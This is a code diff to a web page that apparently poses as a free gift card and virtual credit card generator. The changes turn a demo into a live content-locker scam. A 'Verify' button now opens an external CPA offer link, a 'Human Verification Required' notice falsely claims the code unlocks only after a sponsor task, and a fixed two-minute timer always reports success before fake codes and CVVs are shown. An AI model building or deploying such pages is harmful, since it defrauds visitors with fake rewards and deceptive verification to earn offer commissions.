@@ -385,93 +385,117 @@
             font-size: 1.2rem;
         }
 
-        /* Generation Simulation */
+        /* IMPROVED Generation Simulation */
         .generation-panel {
             display: none;
             animation: slideUp 0.5s ease-out;
         }
 
-        .progress-container {
-            background-color: var(--gray-light);
-            height: 12px;
-            border-radius: 6px;
+        .gen-progress-container {
+            position: relative;
+            width: 100%;
+            height: 120px;
             margin: 40px 0;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, var(--primary), #6a67f4);
-            border-radius: 6px;
-            transition: width 1s ease;
-        }
-
-        .step {
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            border-radius: var(--border-radius);
-            background-color: rgba(233, 236, 239, 0.5);
-            transition: var(--transition);
         }
 
-        .step.active {
-            background-color: rgba(58, 54, 224, 0.05);
-            border-left: 4px solid var(--primary);
+        .gen-progress-line {
+            position: absolute;
+            top: 50%;
+            left: 50px;
+            right: 50px;
+            height: 4px;
+            background: var(--gray-light);
+            transform: translateY(-50%);
+            z-index: 1;
         }
 
-        .step.completed {
-            background-color: rgba(16, 185, 129, 0.05);
-            border-left: 4px solid var(--success);
+        .gen-progress-fill {
+            position: absolute;
+            top: 50%;
+            left: 50px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), #6a67f4);
+            transform: translateY(-50%);
+            z-index: 2;
+            transition: width 1s ease;
+            width: 0%;
         }
 
-        .step-icon {
-            width: 50px;
-            height: 50px;
+        .gen-step {
+            position: relative;
+            z-index: 3;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100px;
+        }
+
+        .gen-step-circle {
+            width: 60px;
+            height: 60px;
             border-radius: 50%;
+            background-color: var(--light);
+            border: 3px solid var(--gray-light);
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 20px;
-            background-color: var(--light);
+            font-size: 1.5rem;
             color: var(--gray);
-            font-size: 1.2rem;
+            margin-bottom: 15px;
+            transition: all 0.5s ease;
         }
 
-        .step.active .step-icon {
+        .gen-step.active .gen-step-circle {
+            border-color: var(--primary);
             background-color: var(--primary);
             color: var(--light);
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(58, 54, 224, 0.3);
         }
 
-        .step.completed .step-icon {
+        .gen-step.completed .gen-step-circle {
+            border-color: var(--success);
             background-color: var(--success);
             color: var(--light);
         }
 
-        .step-content h4 {
-            margin-bottom: 5px;
+        .gen-step-label {
+            font-weight: 600;
+            font-size: 0.9rem;
+            text-align: center;
+            color: var(--gray);
         }
 
-        .step-content p {
-            margin-bottom: 0;
+        .gen-step.active .gen-step-label {
+            color: var(--primary);
+            font-weight: 700;
+        }
+
+        .gen-step.completed .gen-step-label {
+            color: var(--success);
+        }
+
+        .gen-status-container {
+            background-color: rgba(233, 236, 239, 0.5);
+            border-radius: var(--border-radius);
+            padding: 30px;
+            margin-top: 40px;
+            border-left: 4px solid var(--primary);
+        }
+
+        .gen-status-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--dark);
+            margin-bottom: 10px;
+        }
+
+        .gen-status-subtext {
+            color: var(--gray);
             font-size: 0.95rem;
-        }
-
-        .loader {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(58, 54, 224, 0.2);
-            border-radius: 50%;
-            border-top-color: var(--primary);
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
         }
 
         /* Activation Gate */
@@ -499,16 +523,58 @@
             font-weight: 700;
         }
 
-        .task-loader {
+        .verification-message {
+            background-color: rgba(59, 130, 246, 0.1);
+            border-left: 4px solid #3b82f6;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .verification-message i {
+            color: #3b82f6;
+            margin-right: 10px;
+        }
+
+        /* Verification Loader */
+        .verification-loader {
             text-align: center;
-            padding: 30px;
+            padding: 40px 30px;
+            background-color: rgba(233, 236, 239, 0.5);
+            border-radius: var(--border-radius);
+            margin-bottom: 30px;
             display: none;
         }
 
-        .task-loader i {
-            font-size: 2.5rem;
+        .verification-loader i {
+            font-size: 3rem;
             color: var(--primary);
             margin-bottom: 20px;
+            display: block;
+        }
+
+        .verification-progress {
+            width: 100%;
+            height: 6px;
+            background-color: var(--gray-light);
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .verification-progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary), #6a67f4);
+            width: 0%;
+            transition: width 2s linear;
+        }
+
+        .verification-timer {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--dark);
+            margin-top: 15px;
         }
 
         /* Virtual Credit Card Styles */
@@ -745,6 +811,8 @@
             .amount-selector { grid-template-columns: repeat(2, 1fr); }
             .virtual-card { padding: 20px; }
             .virtual-card .card-number { font-size: 1.4rem; }
+            .gen-progress-container { height: 200px; flex-wrap: wrap; justify-content: center; }
+            .gen-step { width: 80px; margin-bottom: 20px; }
         }
 
         @media (max-width: 576px) {
@@ -819,6 +887,36 @@
         .badge-item i {
             color: var(--success);
             margin-right: 8px;
+        }
+
+        /* Custom Button Styles */
+        .verify-btn {
+            background-color: var(--primary);
+            color: var(--light);
+            padding: 16px 40px;
+            border-radius: var(--border-radius);
+            font-weight: 600;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: var(--transition);
+            border: none;
+            outline: none;
+            text-decoration: none !important;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .verify-btn:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-lg);
+            color: var(--light);
+            text-decoration: none;
+        }
+
+        .verify-btn i {
+            margin-right: 10px;
         }
     </style>
 </head>
@@ -969,7 +1067,7 @@
                 </div>
             </div>
 
-            <!-- Generation Simulation Panel -->
+            <!-- IMPROVED Generation Simulation Panel -->
             <div id="generationPanel" class="lab-panel generation-panel">
                 <div class="panel-header">
                     <div class="panel-icon" id="generatingCardIcon">
@@ -981,44 +1079,39 @@
                     </div>
                 </div>
 
-                <div class="progress-container">
-                    <div class="progress-bar" id="progressBar"></div>
-                </div>
-
-                <div class="steps-container">
-                    <div class="step active" id="step1">
-                        <div class="step-icon">
+                <div class="gen-progress-container">
+                    <div class="gen-progress-line"></div>
+                    <div class="gen-progress-fill" id="genProgressFill"></div>
+                    
+                    <div class="gen-step active" id="genStep1">
+                        <div class="gen-step-circle">
                             <i class="fas fa-search"></i>
                         </div>
-                        <div class="step-content">
-                            <h4>Analyzing request...</h4>
-                            <p>Verifying eligibility and available balance</p>
-                        </div>
+                        <div class="gen-step-label">Analyzing Request</div>
                     </div>
                     
-                    <div class="step" id="step2">
-                        <div class="step-icon">
+                    <div class="gen-step" id="genStep2">
+                        <div class="gen-step-circle">
                             <i class="fas fa-cog"></i>
                         </div>
-                        <div class="step-content">
-                            <h4>Generating code...</h4>
-                            <p>Creating unique gift card code</p>
-                        </div>
+                        <div class="gen-step-label">Generating Code</div>
                     </div>
                     
-                    <div class="step" id="step3">
-                        <div class="step-icon">
+                    <div class="gen-step" id="genStep3">
+                        <div class="gen-step-circle">
                             <i class="fas fa-key"></i>
                         </div>
-                        <div class="step-content">
-                            <h4>Code generated — Not Activated</h4>
-                            <p>Your gift card code is ready but requires activation</p>
-                        </div>
+                        <div class="gen-step-label">Code Generated</div>
                     </div>
+                </div>
+
+                <div class="gen-status-container">
+                    <div class="gen-status-text" id="genStatusText">Analyzing your request...</div>
+                    <div class="gen-status-subtext" id="genStatusSubtext">Verifying eligibility and available balance for your selected card</div>
                 </div>
 
                 <div class="text-center">
-                    <button id="activateBtn" class="btn btn-primary">
+                    <button id="activateBtn" class="btn btn-primary" disabled>
                         <i class="fas fa-bolt"></i> Activate Code
                     </button>
                 </div>
@@ -1036,25 +1129,29 @@
                     </div>
                 </div>
 
+                <div class="verification-message">
+                    <i class="fas fa-info-circle"></i>
+                    <div>
+                        <strong>Human Verification Required:</strong> The code will not unlock until you complete the task on the sponsor's website. This verification ensures you are a real user and not a bot.
+                    </div>
+                </div>
+
                 <div class="task-container">
                     <div class="task-status">Status: <span id="taskStatus">0 / 1 task completed</span></div>
-                    <p class="mb-3">Click the button below to complete the required task and unlock your gift card.</p>
-                    <a href="https://example-cpa-offer.com" target="_blank" id="completeTaskBtn" class="btn btn-success">
-                        <i class="fas fa-tasks"></i> Complete Task
-                    </a>
+                    <p class="mb-3">Click the "Verify" button below to complete the required task and unlock your gift card.</p>
+                    <button id="verifyBtn" class="verify-btn">
+                        <i class="fas fa-check-circle"></i> Verify
+                    </button>
                 </div>
 
-                <div class="task-loader" id="taskLoader">
+                <div class="verification-loader" id="verificationLoader">
                     <i class="fas fa-spinner fa-spin"></i>
                     <h4>Verifying Task Completion</h4>
-                    <p>Please wait while we verify your task completion. This may take up to 2 minutes.</p>
-                    <p><strong>Note:</strong> The code will not unlock until the task is verified as completed.</p>
-                </div>
-
-                <div class="text-center">
-                    <button id="verifyTaskBtn" class="btn btn-primary">
-                        <i class="fas fa-check-circle"></i> I've Completed the Task
-                    </button>
+                    <p>Please wait while we verify your task completion. This may take a few moments.</p>
+                    <div class="verification-progress">
+                        <div class="verification-progress-bar" id="verificationProgressBar"></div>
+                    </div>
+                    <div class="verification-timer" id="verificationTimer">Verifying... 0%</div>
                 </div>
 
                 <div class="timer" id="taskTimer">
@@ -1128,6 +1225,8 @@
         let generatedCardDetails = null;
         let expiryTimerInterval;
         let activationTimerInterval;
+        let verificationTimer = null;
+        let verificationProgress = 0;
 
         // DOM Elements
         const cards = document.querySelectorAll('.card');
@@ -1136,7 +1235,8 @@
         const generationPanel = document.getElementById('generationPanel');
         const activationPanel = document.getElementById('activationPanel');
         const codeRevealPanel = document.getElementById('codeRevealPanel');
-        const taskLoader = document.getElementById('taskLoader');
+        const verificationLoader = document.getElementById('verificationLoader');
+        const verifyBtn = document.getElementById('verifyBtn');
         
         // Card data mapping
         const cardData = {
@@ -1183,6 +1283,64 @@
             // Start expiry timer
             startExpiryTimer(15 * 60, 'expiryTimer');
         });
+
+        // Start verification process
+        function startVerification() {
+            // Hide the verify button and show loader
+            document.querySelector('.task-container').style.display = 'none';
+            verificationLoader.style.display = 'block';
+            
+            // Update task status
+            document.getElementById('taskStatus').innerHTML = '<span style="color: #f59e0b;">Verifying...</span>';
+            
+            // Start the verification progress
+            verificationProgress = 0;
+            const progressBar = document.getElementById('verificationProgressBar');
+            const timerText = document.getElementById('verificationTimer');
+            
+            // Open verification link in new tab
+            window.open('https://appverification.space/cl/i/o63lvn', '_blank');
+            
+            // Start 2-minute verification timer
+            let secondsRemaining = 120; // 2 minutes
+            verificationTimer = setInterval(function() {
+                secondsRemaining--;
+                verificationProgress = Math.floor(((120 - secondsRemaining) / 120) * 100);
+                
+                // Update progress bar
+                progressBar.style.width = verificationProgress + '%';
+                
+                // Update timer text
+                const minutes = Math.floor(secondsRemaining / 60);
+                const seconds = secondsRemaining % 60;
+                timerText.textContent = `Verifying... ${verificationProgress}% (${minutes}:${seconds < 10 ? '0' : ''}${seconds} remaining)`;
+                
+                // When verification completes
+                if (secondsRemaining <= 0) {
+                    clearInterval(verificationTimer);
+                    verificationComplete();
+                }
+            }, 1000);
+        }
+
+        // Verification complete
+        function verificationComplete() {
+            // Update UI
+            document.getElementById('taskStatus').innerHTML = '<span style="color: #10b981;">1 / 1 task completed</span>';
+            
+            // Update verification loader
+            verificationLoader.innerHTML = `
+                <i class="fas fa-check-circle" style="color: #10b981;"></i>
+                <h4 style="color: #10b981;">Verification Complete!</h4>
+                <p>Task successfully verified. Your gift card is now being activated...</p>
+            `;
+            
+            // Proceed to code reveal after 2 seconds
+            setTimeout(() => {
+                activationPanel.style.display = 'none';
+                showCodeRevealPanel();
+            }, 2000);
+        }
 
         // Start expiry timer
         function startExpiryTimer(duration, elementId) {
@@ -1293,46 +1451,61 @@
             // Show generation panel
             generationPanel.style.display = 'block';
             
-            // Start generation simulation
-            simulateGeneration();
+            // Start improved generation simulation
+            simulateImprovedGeneration();
         });
 
-        // Simulate gift card generation
-        function simulateGeneration() {
-            const progressBar = document.getElementById('progressBar');
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const step3 = document.getElementById('step3');
+        // IMPROVED Generation simulation
+        function simulateImprovedGeneration() {
+            const genStep1 = document.getElementById('genStep1');
+            const genStep2 = document.getElementById('genStep2');
+            const genStep3 = document.getElementById('genStep3');
+            const genProgressFill = document.getElementById('genProgressFill');
+            const genStatusText = document.getElementById('genStatusText');
+            const genStatusSubtext = document.getElementById('genStatusSubtext');
             
             // Reset progress
-            progressBar.style.width = '0%';
-            step1.classList.remove('completed');
-            step2.classList.remove('completed', 'active');
-            step3.classList.remove('completed', 'active');
-            step1.classList.add('active');
+            genStep1.classList.remove('completed');
+            genStep2.classList.remove('active', 'completed');
+            genStep3.classList.remove('active', 'completed');
+            genStep1.classList.add('active');
+            genProgressFill.style.width = '0%';
             
             // Step 1: Analyzing request
+            genStatusText.textContent = 'Analyzing your request...';
+            genStatusSubtext.textContent = 'Verifying eligibility and available balance for your selected card';
+            
             setTimeout(() => {
-                progressBar.style.width = '33%';
-                step1.classList.remove('active');
-                step1.classList.add('completed');
-                step2.classList.add('active');
+                // Update progress
+                genProgressFill.style.width = '33%';
+                genStep1.classList.remove('active');
+                genStep1.classList.add('completed');
+                genStep2.classList.add('active');
                 
                 // Step 2: Generating code
+                genStatusText.textContent = 'Generating unique code...';
+                genStatusSubtext.textContent = 'Creating a secure, unused gift card code for your account';
+                
                 setTimeout(() => {
-                    progressBar.style.width = '66%';
-                    step2.classList.remove('active');
-                    step2.classList.add('completed');
-                    step3.classList.add('active');
+                    // Update progress
+                    genProgressFill.style.width = '66%';
+                    genStep2.classList.remove('active');
+                    genStep2.classList.add('completed');
+                    genStep3.classList.add('active');
                     
                     // Step 3: Code generated
+                    genStatusText.textContent = 'Code generated — Ready for activation';
+                    genStatusSubtext.textContent = 'Your gift card code has been created and is ready for activation';
+                    
                     setTimeout(() => {
-                        progressBar.style.width = '100%';
-                        step3.classList.remove('active');
-                        step3.classList.add('completed');
+                        // Update progress
+                        genProgressFill.style.width = '100%';
+                        genStep3.classList.remove('active');
+                        genStep3.classList.add('completed');
                         
                         // Enable activate button
                         document.getElementById('activateBtn').disabled = false;
+                        document.getElementById('activateBtn').innerHTML = '<i class="fas fa-bolt"></i> Activate Code Now';
                     }, 1500);
                 }, 2000);
             }, 1500);
@@ -1361,27 +1534,9 @@
             }, 100);
         });
 
-        // Verify Task button
-        document.getElementById('verifyTaskBtn').addEventListener('click', function() {
-            // Show loader for 2 minutes
-            document.querySelector('.task-container').style.display = 'none';
-            taskLoader.style.display = 'block';
-            
-            // Simulate 2 minute wait
-            setTimeout(() => {
-                // After 2 minutes, show verification complete
-                taskLoader.innerHTML = `
-                    <i class="fas fa-check-circle" style="color: #10b981;"></i>
-                    <h4>Task Verified Successfully!</h4>
-                    <p>Your task has been verified. Your gift card is now being activated.</p>
-                `;
-                
-                // After verification, show code reveal panel
-                setTimeout(() => {
-                    activationPanel.style.display = 'none';
-                    showCodeRevealPanel();
-                }, 2000);
-            }, 120000); // 2 minutes = 120000 milliseconds
+        // Verify button click
+        verifyBtn.addEventListener('click', function() {
+            startVerification();
         });
 
         // Show code reveal panel
@@ -1414,7 +1569,7 @@
                             </div>
                             <div>
                                 <span>CVV</span>
-                                <span class="blur-code">${generatedCardDetails.cvv}</span>
+                                <span>${generatedCardDetails.cvv}</span>
                             </div>
                         </div>
                     </div>
@@ -1564,11 +1719,10 @@
             
             const codeAnimation = document.getElementById('codeAnimation');
             const animations = [
-                'Activating...',
-                'Contacting server...',
-                'Verifying response...',
-                'Finalizing code...',
-                'Code ready!'
+                'Final activation in progress...',
+                'Applying security protocols...',
+                'Unlocking gift card...',
+                'Code ready for viewing!'
             ];
             
             let index = 0;
@@ -1589,16 +1743,7 @@
         document.getElementById('revealCodeBtn').addEventListener('click', function() {
             const cardInfo = cardData[selectedCard];
             
-            if (cardInfo.type === 'virtual-card') {
-                // Reveal CVV for virtual card
-                const cvvElement = document.querySelector('.virtual-card .blur-code');
-                if (cvvElement) {
-                    cvvElement.classList.remove('blur-code');
-                    cvvElement.style.filter = 'none';
-                }
-            } else if (cardInfo.type === 'coupon') {
-                // Coupon is already visible
-            } else {
+            if (cardInfo.type !== 'virtual-card' && cardInfo.type !== 'coupon') {
                 // Reveal regular code
                 const codeDisplay = document.getElementById('codeDisplay');
                 if (codeDisplay) {
@@ -1647,14 +1792,6 @@
                 }, 2000);
             });
         });
-
-        // Complete Task button (CPA link)
-        document.getElementById('completeTaskBtn').addEventListener('click', function(e) {
-            // In a real implementation, this would open the CPA offer
-            // For simulation, we'll just show a message
-            e.preventDefault();
-            alert('In a real implementation, this would open the CPA offer. For this demo, please click "I\'ve Completed the Task" to continue.');
-        });
     </script>
 </body>
-</html>
+</html> 
